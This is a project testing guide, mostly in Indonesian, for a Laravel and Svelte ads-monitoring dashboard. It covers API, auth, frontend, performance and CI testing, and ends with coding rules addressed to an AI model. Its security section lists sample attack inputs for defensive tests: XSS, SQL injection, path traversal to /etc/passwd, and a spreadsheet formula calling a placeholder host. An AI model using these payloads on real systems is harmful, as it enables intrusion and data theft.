# TESTING.md

## Testing Strategy

Project ini menggunakan:

- **Backend API:** Laravel PHP
- **Frontend:** Svelte
- **Authentication:** JWT
- **Database:** PostgreSQL
- **UI Framework:** Tailwind CSS + DaisyUI
- **Container:** Docker

Dokumen ini mendefinisikan standar testing untuk Dashboard Monitoring Programmatic Ads & Website Performance.

---

## 1. Testing Goals

Tujuan testing:

1. Memastikan Laravel API berjalan benar, aman, dan konsisten.
2. Memastikan JWT authentication dan role-based access control bekerja sesuai ekspektasi.
3. Memastikan dashboard Svelte dapat menampilkan data monitoring secara akurat.
4. Memastikan data programmatic ads, Prebid.js, GAM, network ads, dan Web Core Vitals diproses dengan benar.
5. Memastikan UI DaisyUI putih-biru konsisten dan usable.
6. Memastikan regression dapat terdeteksi sebelum deployment.

---

## 2. Test Pyramid

Prioritas testing:

1. **Unit Test** untuk business logic kecil dan service class.
2. **Feature/API Test** untuk endpoint Laravel.
3. **Integration Test** untuk database, queue, dan external data adapter.
4. **Frontend Component Test** untuk komponen Svelte.
5. **E2E Test** untuk flow utama user.
6. **Performance Test** untuk endpoint dashboard dan query agregasi.
7. **Security Test** untuk auth, role, input validation, dan rate limit.

---

## 3. Backend Testing — Laravel

### 3.1 Recommended Tools

Laravel backend menggunakan:

- PHPUnit atau Pest.
- Laravel Feature Test.
- Laravel HTTP Test.
- Laravel Database Test.
- Laravel Queue Fake.
- Laravel Event Fake.
- Mockery untuk mocking service.

Recommended default: **Pest** untuk syntax yang lebih ringkas, tetapi PHPUnit tetap diterima.

Install Pest jika dipakai:

```bash
composer require pestphp/pest --dev --with-all-dependencies
composer require pestphp/pest-plugin-laravel --dev
php artisan pest:install
```

Run test:

```bash
php artisan test
```

atau:

```bash
./vendor/bin/pest
```

---

## 4. Laravel Test Environment

Gunakan `.env.testing`.

Contoh minimal:

```env
APP_ENV=testing
APP_DEBUG=true
DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=programmatic_dashboard_test
DB_USERNAME=postgres
DB_PASSWORD=postgres
CACHE_STORE=array
QUEUE_CONNECTION=sync
SESSION_DRIVER=array
MAIL_MAILER=array
JWT_SECRET=testing_jwt_secret_do_not_use_in_production
```

Untuk local test yang cepat, SQLite boleh digunakan hanya jika tidak mengubah behavior PostgreSQL-specific query.

Namun, karena schema project menggunakan PostgreSQL dan data agregasi, test utama sebaiknya tetap dijalankan di PostgreSQL.

---

## 5. Backend Unit Test Scope

Unit test wajib dibuat untuk:

1. Revenue metric calculation.
2. Fill rate calculation.
3. eCPM calculation.
4. Bid response rate calculation.
5. Timeout rate calculation.
6. Web Core Vitals status classification.
7. Alert severity evaluation.
8. URL sanitization.
9. CSV formula injection prevention.
10. Date range normalization.

Contoh test case:

```php
it('calculates fill rate correctly', function () {
    $service = new MetricCalculator();

    expect($service->fillRate(800, 1000))->toBe(80.0);
});
```

---

## 6. Backend Feature/API Test Scope

Feature test wajib dibuat untuk endpoint berikut:

### 6.1 Auth API

- `POST /api/v1/auth/login`
- `POST /api/v1/auth/logout`
- `POST /api/v1/auth/refresh`
- `GET /api/v1/auth/me`

Test scenarios:

- Login berhasil dengan credential valid.
- Login gagal dengan password salah.
- Login gagal untuk user inactive.
- Response login mengembalikan access token.
- Endpoint privat gagal tanpa token.
- Endpoint privat berhasil dengan token valid.
- Logout merevoke token.
- Refresh token berjalan sesuai aturan.

### 6.2 Dashboard API

- `GET /api/v1/dashboard/overview`
- `GET /api/v1/slots`
- `GET /api/v1/bidders`
- `GET /api/v1/prebid/health`
- `GET /api/v1/gam/health`
- `GET /api/v1/network-ads`
- `GET /api/v1/web-vitals`
- `GET /api/v1/alerts`

Test scenarios:

- Endpoint membutuhkan JWT.
- Filter date range tervalidasi.
- Filter domain/page/device bekerja.
- Pagination bekerja.
- Sorting bekerja.
- Response menggunakan struktur JSON konsisten.
- Role viewer hanya read-only.
- Role tanpa permission mendapatkan 403.

Contoh struktur response yang perlu diuji:

```json
{
  "success": true,
  "data": {},
  "meta": {},
  "errors": []
}
```

---

## 7. Authorization Test

Setiap module wajib memiliki test RBAC.

Minimum test matrix:

| Scenario | Expected |
|---|---|
| Guest access dashboard API | 401 |
| Viewer access overview | 200 |
| Viewer update alert rule | 403 |
| Programmatic user access slot performance | 200 |
| AdOps access GAM monitoring | 200 |
| Tech access network ads | 200 |
| Non-admin access user management | 403 |
| Admin access settings | 200 |

Laravel test helper disarankan:

```php
actingAsUserWithRole('admin');
actingAsUserWithRole('viewer');
```

---

## 8. Database Testing

Gunakan migration dan seeder untuk test data.

Wajib menggunakan:

```php
use RefreshDatabase;
```

atau strategi transaction jika lebih cepat.

Data factory yang perlu tersedia:

- UserFactory.
- RoleFactory.
- DomainFactory.
- PageFactory.
- AdSlotFactory.
- BidderFactory.
- BidEventFactory.
- PrebidAuctionFactory.
- GamRequestFactory.
- NetworkRequestFactory.
- WebVitalMetricFactory.
- AlertFactory.

Test database wajib mencakup:

- Foreign key constraint.
- Unique constraint.
- Index-based query tidak terlalu lambat.
- Soft delete behavior jika digunakan.
- Aggregation query correctness.

---

## 9. Event Ingestion Testing

Karena aplikasi memonitor Prebid.js, GAM, network ads, dan Web Core Vitals, ingestion endpoint harus diuji secara ketat.

Contoh endpoint:

- `POST /api/v1/ingest/prebid-events`
- `POST /api/v1/ingest/gam-events`
- `POST /api/v1/ingest/web-vitals`
- `POST /api/v1/ingest/network-requests`

Test scenarios:

- Payload valid diterima.
- Payload invalid ditolak 422.
- Payload terlalu besar ditolak.
- Event duplicate ditangani idempotently jika event_id tersedia.
- URL disanitasi sebelum disimpan.
- Unknown bidder tidak menyebabkan crash.
- Timestamp future/past abnormal ditandai atau ditolak sesuai aturan.

---

## 10. Queue & Job Testing

Jika menggunakan Laravel Queue untuk aggregation/report:

Wajib test:

- Job dispatch.
- Job retry.
- Job failure handling.
- Aggregation result correctness.
- Alert generation job.
- Export job.

Contoh:

```php
Queue::fake();

$response = $this->postJson('/api/v1/export/slots', $payload);

Queue::assertPushed(GenerateSlotExportJob::class);
```

---

## 11. Frontend Testing — Svelte

### 11.1 Recommended Tools

Frontend Svelte menggunakan:

- Vitest.
- Testing Library for Svelte.
- Playwright untuk E2E.
- MSW untuk API mocking jika diperlukan.

Install:

```bash
npm install -D vitest @testing-library/svelte @testing-library/jest-dom jsdom
npm install -D @playwright/test
```

Run unit/component test:

```bash
npm run test
```

Run e2e:

```bash
npx playwright test
```

---

## 12. Frontend Component Test Scope

Component test wajib dibuat untuk:

1. Login form.
2. Dashboard KPI cards.
3. Slot performance table.
4. Bidder health table.
5. Alert list.
6. Web Core Vitals status badge.
7. Filter bar.
8. Date range picker.
9. Empty state.
10. Error state.
11. Loading skeleton.

Test scenarios:

- Component render dengan data valid.
- Loading state tampil.
- Error state tampil.
- Empty state tampil.
- Filter event mengubah query.
- Badge severity sesuai threshold.
- DaisyUI class tidak merusak accessibility role.

---

## 13. Svelte Auth Testing

Wajib test:

- Login menyimpan auth state.
- Logout menghapus auth state.
- Expired token memicu 401 handling.
- Protected route redirect ke login.
- User tanpa role tidak melihat menu yang tidak berhak.
- API client menambahkan Authorization header.

Jangan test dengan token production.

Gunakan mock token.

---

## 14. UI Testing — DaisyUI White Blue Samurai Theme

Tema UI project: **white-blue with samurai blue accent**.

Komponen yang perlu diuji visual/behavior:

- Navbar.
- Sidebar.
- KPI card.
- Table.
- Badge.
- Alert banner.
- Filter panel.
- Modal.
- Button primary.
- Chart container.

Aturan visual:

- Background utama putih atau near-white.
- Primary color menggunakan biru samurai.
- Border halus, tidak terlalu gelap.
- Critical alert tetap merah, warning tetap amber/orange, success tetap hijau.
- Kontras teks harus memenuhi readability.

Suggested palette:

```text
Primary Samurai Blue: #1E3A8A
Primary Hover: #1D4ED8
Accent Blue: #2563EB
Soft Blue Surface: #EFF6FF
Deep Navy Text: #0F172A
Muted Text: #64748B
Border: #DBEAFE
Background: #FFFFFF
Page Background: #F8FAFC
```

---

## 15. E2E Testing Scope

Gunakan Playwright.

Critical user flows:

1. User login.
2. User melihat overview dashboard.
3. User filter domain dan date range.
4. User membuka detail slot.
5. User membuka bidding monitoring.
6. User membuka Prebid health.
7. User membuka GAM monitoring.
8. User membuka Web Core Vitals.
9. User melihat alert detail.
10. User logout.

Admin-only flows:

1. Admin login.
2. Admin membuka settings.
3. Admin mengubah threshold alert.
4. Admin menambah user.
5. Admin logout.

---

## 16. API Contract Testing

Laravel API dan Svelte frontend harus sepakat pada response contract.

Setiap endpoint wajib memiliki contoh response.

Recommended:

- Simpan API contract dalam OpenAPI spec.
- Gunakan contract untuk mock frontend.
- Validasi breaking change sebelum merge.

Response standar:

```json
{
  "success": true,
  "data": {},
  "meta": {
    "request_id": "uuid",
    "timestamp": "2026-06-14T10:00:00Z"
  },
  "errors": []
}
```

Error standar:

```json
{
  "success": false,
  "data": null,
  "meta": {
    "request_id": "uuid",
    "timestamp": "2026-06-14T10:00:00Z"
  },
  "errors": [
    {
      "code": "VALIDATION_ERROR",
      "message": "The date_from field is required.",
      "field": "date_from"
    }
  ]
}
```

---

## 17. Performance Testing

Dashboard endpoint harus diuji untuk data agregat besar.

Target awal:

| Endpoint | Target Response Time |
|---|---:|
| `/dashboard/overview` | < 1000 ms |
| `/slots` | < 1500 ms |
| `/bidders` | < 1500 ms |
| `/web-vitals` | < 1500 ms |
| `/network-ads` | < 2000 ms |
| `/alerts` | < 1000 ms |

Testing tools:

- k6.
- Artillery.
- Laravel Telescope untuk local debugging.
- EXPLAIN ANALYZE untuk query PostgreSQL.

---

## 18. Security Testing

Security test minimum:

- Endpoint privat tanpa token menghasilkan 401.
- Token invalid menghasilkan 401.
- Token expired menghasilkan 401.
- Role tidak sesuai menghasilkan 403.
- Login rate limit aktif.
- Input invalid menghasilkan 422.
- SQL injection payload tidak berhasil.
- XSS payload tidak dirender sebagai HTML di frontend.
- CORS hanya menerima origin yang valid.
- Debug mode off di production.

Contoh malicious input:

```text
<script>alert(1)</script>
' OR '1'='1
../../../../etc/passwd
=IMPORTXML("http://evil.test")
```

---

## 19. Docker Testing

Test wajib dilakukan melalui Docker untuk memastikan environment konsisten.

Minimal commands:

```bash
docker compose build
docker compose up -d
```

Backend test inside container:

```bash
docker compose exec api php artisan test
```

Frontend test inside container:

```bash
docker compose exec frontend npm run test
```

Migration test:

```bash
docker compose exec api php artisan migrate:fresh --seed
```

---

## 20. CI/CD Testing Pipeline

Pipeline minimal:

1. Install backend dependencies.
2. Run PHP lint.
3. Run Laravel test.
4. Run static analysis.
5. Install frontend dependencies.
6. Run frontend lint.
7. Run Svelte unit/component test.
8. Build frontend.
9. Build Docker image.
10. Run dependency audit.

Suggested backend checks:

```bash
composer validate
composer audit
php artisan test
```

Suggested frontend checks:

```bash
npm ci
npm run lint
npm run test
npm run build
npm audit
```

---

## 21. Definition of Done

Sebuah feature dianggap selesai jika:

- [ ] Backend API sudah memiliki unit/feature test.
- [ ] Frontend component sudah memiliki test minimal untuk state utama.
- [ ] Auth dan permission sudah diuji.
- [ ] Input validation sudah diuji.
- [ ] Error response sudah konsisten.
- [ ] Loading/empty/error state tersedia di UI.
- [ ] Tidak ada secret di commit.
- [ ] Test pass di local dan Docker.
- [ ] Dokumentasi endpoint diperbarui.
- [ ] Tidak ada regression pada flow login dan dashboard.

---

## 22. Testing Rules for Claude / AI Assistant

Saat membuat kode untuk project ini, Claude/AI assistant wajib:

1. Menambahkan test untuk setiap service/backend endpoint baru.
2. Menambahkan test auth untuk endpoint privat.
3. Menambahkan test permission jika endpoint role-specific.
4. Menambahkan test validation untuk Form Request.
5. Menambahkan test Svelte component untuk komponen penting.
6. Tidak membuat kode tanpa mempertimbangkan testability.
7. Memisahkan business logic ke service class agar mudah diuji.
8. Menggunakan factory dan seeder untuk test data.
9. Menghindari dependency langsung ke external API di test.
10. Menggunakan mock/fake untuk GAM, GA4, Prebid ingestion, dan queue.

